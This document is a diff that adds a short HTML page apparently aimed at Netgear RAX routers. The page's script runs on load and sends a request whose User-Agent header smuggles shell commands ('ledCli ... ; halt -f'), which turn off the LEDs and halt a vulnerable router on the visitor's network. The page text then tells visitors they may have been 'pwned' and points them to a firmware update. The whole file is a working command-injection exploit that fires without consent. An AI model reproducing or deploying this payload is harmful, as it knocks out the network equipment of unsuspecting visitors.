@@ -1,0 +1,17 @@
+    <html>
+        <head>
+            <script>Object.defineProperty(navigator, 'userAgent', {
+                    get: function () { return 'TEST'; }
+                });
+                const xhr = new XMLHttpRequest()
+                xhr.open("GET", "/")
+                xhr.setRequestHeader("User-Agent", '"; ledCli ALLSW MSG_LED_ALL_SW_OFF; sleep 1; halt -f;"');
+                xhr.send()
+            </script>
+        </head>
+            
+        <body>
+            <h1> You may have been pwned! </h1>
+            <h2> If you are on a Netgear RAX model router and you can't reload this page that means you have been pwned. To be more specific, your entire router wifi interface is turned off now, if you were pwned. Don't worry, we did not do anything else. Just go turn on your router and update it to the latest firmware. 
+        </body>
+    </html>
